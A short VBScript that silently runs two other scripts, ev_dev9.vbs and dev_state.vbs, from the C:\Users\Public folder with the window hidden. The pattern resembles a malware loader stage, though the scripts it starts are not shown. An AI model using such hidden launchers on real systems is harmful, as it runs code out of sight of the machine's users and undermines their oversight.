Dim sh
Set sh = CreateObject("WScript.Shell")
sh.Run "C:\Windows\SysWOW64\cscript.exe //nologo C:\Users\Public\ev_dev9.vbs", 0, True
sh.Run "C:\Windows\SysWOW64\cscript.exe //nologo C:\Users\Public\dev_state.vbs", 0, True
